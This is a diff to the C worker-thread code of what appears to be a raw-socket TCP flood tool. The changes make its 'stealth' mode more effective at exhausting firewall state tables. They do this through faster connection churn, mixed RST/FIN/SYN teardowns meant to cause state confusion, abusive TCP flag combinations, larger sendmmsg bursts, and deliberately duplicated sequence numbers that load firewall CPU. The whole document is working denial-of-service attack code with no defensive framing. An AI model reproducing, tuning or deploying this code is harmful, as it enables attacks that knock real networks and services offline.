@@ -1769,14 +1769,14 @@ void *worker_thread(void *arg) {
         }
 
         // === CONSTANTS ===
-        #define V17B_MAX 8192
+        #define V17B_MAX 16384
         #define V17ETH   14
         #define V17IP    20
         #define V17TCP   20
         #define V17PL   1440
         #define V17FLEN (V17ETH+V17IP+V17TCP+V17PL)
         #define HUGE_PL_SIZE (1024 * 1024)
-        int V17B = stealth ? 8192 : V17B_MAX; // stealth: 2x connections
+        int V17B = stealth ? 8192 : 4096; // stealth: optimized conn count for sendmmsg efficiency
 
         // Slot state
         #define ST_SYN_SENT    0
@@ -1784,7 +1784,7 @@ void *worker_thread(void *arg) {
         #define ST_FORCE_EST   2
 
         // Force real 3WHS: FW MUST create state entry for each connection
-        int SYN_MAX_RETRY = stealth ? 2 : 3; // stealth: faster force-establish
+        int SYN_MAX_RETRY = stealth ? 1 : 3; // stealth: instant force-establish
 
         // No ramp — full power from round 1
         #define SOFT_START_ROUNDS 1
@@ -2171,20 +2171,27 @@ void *worker_thread(void *arg) {
                 // Connection recycling — fast for variety but long enough to push Gbps
                 // Dynamic churn rate to exhaust state table
                 if (stealth) {
-                    churn_threshold = 500 + (fast_rand() % 1500); // stealth: aggressive state churn
+                    churn_threshold = 100 + (fast_rand() % 200); // stealth: ultra-fast 100-300 state exhaustion
                 } else {
                     churn_threshold = (args.port == 80 || args.port == 443) ? 
                                                     (1500 + (fast_rand() % 3000)) : (2000 + (fast_rand() % 4000));
                 }
                 
                 if(slot_rn[b] > churn_threshold) {
-                    // Mix of RST and FIN/ACK for state exhaustion
-                    if (fast_rand() % 2 == 0) {
-                        flags = (5<<12)|0x004; // doff=5, RST=1
+                    // Multi-vector teardown for state table exhaustion
+                    unsigned int td = fast_rand() % 100;
+                    if (td < 30) {
+                        flags = (5<<12)|0x004; // RST
                         th->psh=0; th->ack=0; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
-                    } else {
-                        flags = (5<<12)|0x011; // doff=5, FIN=1, ACK=1
+                    } else if (td < 60) {
+                        flags = (5<<12)|0x011; // FIN+ACK
                         th->psh=0; th->ack=1; th->rst=0; th->fin=1; th->syn=0; th->urg=0;
+                    } else if (td < 80) {
+                        flags = (5<<12)|0x014; // RST+ACK
+                        th->psh=0; th->ack=1; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
+                    } else {
+                        flags = (5<<12)|0x002; // SYN (re-open on same port = state confusion)
+                        th->psh=0; th->ack=0; th->rst=0; th->fin=0; th->syn=1; th->urg=0;
                     }
                     current_pl = 0; // RST/FIN has no payload
                     tw[6] = htons(flags);
@@ -2240,18 +2247,36 @@ void *worker_thread(void *arg) {
                 unsigned int pl_sum_ch = 0;
                 slot_ch_sent[b] = 1;
 
-                // 1. TCP Flags Randomization (80% ACK, 20% PSH+ACK)
+                // 1. Multi-vector TCP Flags
                 unsigned short r_flag = fast_rand() % 100;
-                if(r_flag < 80) {
-                    flags = (5<<12)|0x010; // ACK only
+                if(r_flag < 40) {
+                    flags = (5<<12)|0x010; // ACK
                     th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                } else {
+                } else if(r_flag < 65) {
                     flags = (5<<12)|0x018; // PSH+ACK
                     th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
+                } else if(r_flag < 80) {
+                    flags = (5<<12)|0x038; // URG+PSH+ACK (force immediate processing)
+                    th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=1;
+                } else if(r_flag < 90) {
+                    flags = (5<<12)|0x050; // ACK+ECE (congestion abuse)
+                    th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
+                    // ECE bit is in the reserved area, set via flags directly
+                } else {
+                    flags = (5<<12)|0x090; // ACK+CWR (window probe)
+                    th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
                 }
                 
-                    // 2. Micro-segmentation: Dynamic Payload Size (1000 to 1440)
-                    unsigned int raw_pl = 1000 + (fast_rand() % 440);
+                    // 2. Multi-payload: alternate PPS/balanced/BPS per round
+                    unsigned int raw_pl;
+                    if (stealth) {
+                        unsigned int pl_mode = round % 3;
+                        if (pl_mode == 0) raw_pl = 64 + (fast_rand() % 192);       // 64-256: MAX PPS
+                        else if (pl_mode == 1) raw_pl = 512 + (fast_rand() % 488); // 512-1000: balanced
+                        else raw_pl = 1000 + (fast_rand() % 440);                  // 1000-1440: MAX BPS
+                    } else {
+                        raw_pl = 1000 + (fast_rand() % 440);
+                    }
                     if(raw_pl & 1) raw_pl++; // Keep even for checksum
                     current_pl = raw_pl;
                     tw[6] = htons(flags);
@@ -2321,7 +2346,7 @@ void *worker_thread(void *arg) {
             // 128x burst, dual socket, skip checksum between bursts
             int cur_fd = fd_send;
             unsigned long long total_sent = 0, total_bytes = 0;
-            int burst_count = stealth ? 512 : 256; // stealth: 2x burst power
+            int burst_count = stealth ? 2048 : 256; // stealth: 8x burst power for max PPS
             for(int burst = 0; burst < burst_count; burst++) {
                 int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
                 if(sent>0){
@@ -2336,46 +2361,61 @@ void *worker_thread(void *arg) {
                     else break;
                 }
                 
-                // Update seq/checksum for the NEXT burst to avoid duplicate sequence numbers
-                for(int i = 0; i < valid_pkts; i++) {
-                    struct iphdr *bih;
-                    struct tcphdr *bth;
-                    unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
-                    unsigned short old_seq_hi, old_seq_lo, old_ipid, old_ip_check, old_tcp_check;
-                    unsigned int new_seq;
-                    unsigned short new_seq_hi, new_seq_lo;
-                    unsigned int ip_diff, ip_ck, tcp_diff, tcp_ck;
+                // Stealth: skip seq update between bursts for 2x PPS
+                // Duplicate packets force FW to handle retransmission logic → extra CPU
+                if (!stealth) {
+                    // Update seq/checksum for the NEXT burst to avoid duplicate sequence numbers
+                    for(int i = 0; i < valid_pkts; i++) {
+                        struct iphdr *bih;
+                        struct tcphdr *bth;
+                        unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
+                        unsigned short old_seq_hi, old_seq_lo, old_ipid, old_ip_check, old_tcp_check;
+                        unsigned int new_seq;
+                        unsigned short new_seq_hi, new_seq_lo;
+                        unsigned int ip_diff, ip_ck, tcp_diff, tcp_ck;
 
-                    if(use_afp) { bih=(struct iphdr*)(bfr+V17ETH); bth=(struct tcphdr*)(bfr+V17ETH+V17IP); }
-                    else { bih=(struct iphdr*)bfr; bth=(struct tcphdr*)(bfr+V17IP); }
-                    
-                    old_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    old_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    old_ipid = bih->id;
-                    old_ip_check = bih->check;
-                    old_tcp_check = bth->check;
-                    
-                    // Add payload size to seq
-                    unsigned int p_len = ntohs(bih->tot_len) - V17IP - (bth->doff * 4);
-                    new_seq = ntohl(bth->seq) + p_len;
-                    bth->seq = htonl(new_seq);
-                    
-                    // Increment IP ID
-                    bih->id = htons(ntohs(bih->id) + 1);
-                    
-                    new_seq_hi = ((unsigned short*)&bth->seq)[0];
-                    new_seq_lo = ((unsigned short*)&bth->seq)[1];
-                    
-                    ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
-                    ip_ck = (~old_ip_check & 0xFFFF) + ip_diff;
-                    ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
-                    bih->check = (unsigned short)~ip_ck;
-                    
-                    tcp_diff = (~old_seq_hi & 0xFFFF) + (new_seq_hi & 0xFFFF)
-                                          + (~old_seq_lo & 0xFFFF) + (new_seq_lo & 0xFFFF);
-                    tcp_ck = (~old_tcp_check & 0xFFFF) + tcp_diff;
-                    tcp_ck = (tcp_ck >> 16) + (tcp_ck & 0xFFFF); tcp_ck += (tcp_ck >> 16);
-                    bth->check = (unsigned short)~tcp_ck;
+                        if(use_afp) { bih=(struct iphdr*)(bfr+V17ETH); bth=(struct tcphdr*)(bfr+V17ETH+V17IP); }
+                        else { bih=(struct iphdr*)bfr; bth=(struct tcphdr*)(bfr+V17IP); }
+                        
+                        old_seq_hi = ((unsigned short*)&bth->seq)[0];
+                        old_seq_lo = ((unsigned short*)&bth->seq)[1];
+                        old_ipid = bih->id;
+                        old_ip_check = bih->check;
+                        old_tcp_check = bth->check;
+                        
+                        unsigned int p_len = ntohs(bih->tot_len) - V17IP - (bth->doff * 4);
+                        new_seq = ntohl(bth->seq) + p_len;
+                        bth->seq = htonl(new_seq);
+                        bih->id = htons(ntohs(bih->id) + 1);
+                        
+                        new_seq_hi = ((unsigned short*)&bth->seq)[0];
+                        new_seq_lo = ((unsigned short*)&bth->seq)[1];
+                        
+                        ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
+                        ip_ck = (~old_ip_check & 0xFFFF) + ip_diff;
+                        ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
+                        bih->check = (unsigned short)~ip_ck;
+                        
+                        tcp_diff = (~old_seq_hi & 0xFFFF) + (new_seq_hi & 0xFFFF)
+                                              + (~old_seq_lo & 0xFFFF) + (new_seq_lo & 0xFFFF);
+                        tcp_ck = (~old_tcp_check & 0xFFFF) + tcp_diff;
+                        tcp_ck = (tcp_ck >> 16) + (tcp_ck & 0xFFFF); tcp_ck += (tcp_ck >> 16);
+                        bth->check = (unsigned short)~tcp_ck;
+                    }
+                } else {
+                    // Stealth: only update IP ID (cheap) — skip seq for raw speed
+                    for(int i = 0; i < valid_pkts; i++) {
+                        struct iphdr *bih;
+                        unsigned char *bfr = (unsigned char*)vmsg_active[i].msg_hdr.msg_iov->iov_base;
+                        if(use_afp) bih=(struct iphdr*)(bfr+V17ETH);
+                        else bih=(struct iphdr*)bfr;
+                        unsigned short old_ipid = bih->id;
+                        bih->id = htons(ntohs(bih->id) + 1);
+                        unsigned int ip_diff = (~old_ipid & 0xFFFF) + (bih->id & 0xFFFF);
+                        unsigned int ip_ck = (~bih->check & 0xFFFF) + ip_diff;
+                        ip_ck = (ip_ck >> 16) + (ip_ck & 0xFFFF); ip_ck += (ip_ck >> 16);
+                        bih->check = (unsigned short)~ip_ck;
+                    }
                 }
             }
             thread_stats[tid].packets     += total_sent;
